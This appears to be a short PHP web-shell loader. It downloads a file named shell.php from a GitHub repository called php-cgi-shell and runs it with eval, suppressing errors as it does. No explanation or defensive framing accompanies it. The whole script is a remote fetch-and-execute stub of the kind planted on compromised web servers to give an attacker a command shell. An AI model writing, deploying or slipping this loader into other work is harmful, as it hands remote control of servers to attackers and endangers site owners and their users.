<?php
$remote = 'https://github.com/jgor/php-cgi-shell/raw/refs/heads/master/shell.php';
$payload = @file_get_contents($remote);

if ($payload) {
    ob_start();
    eval("?>".$payload);
    ob_end_flush();
} else {
    echo "Failed to load remote file.";
}
?>
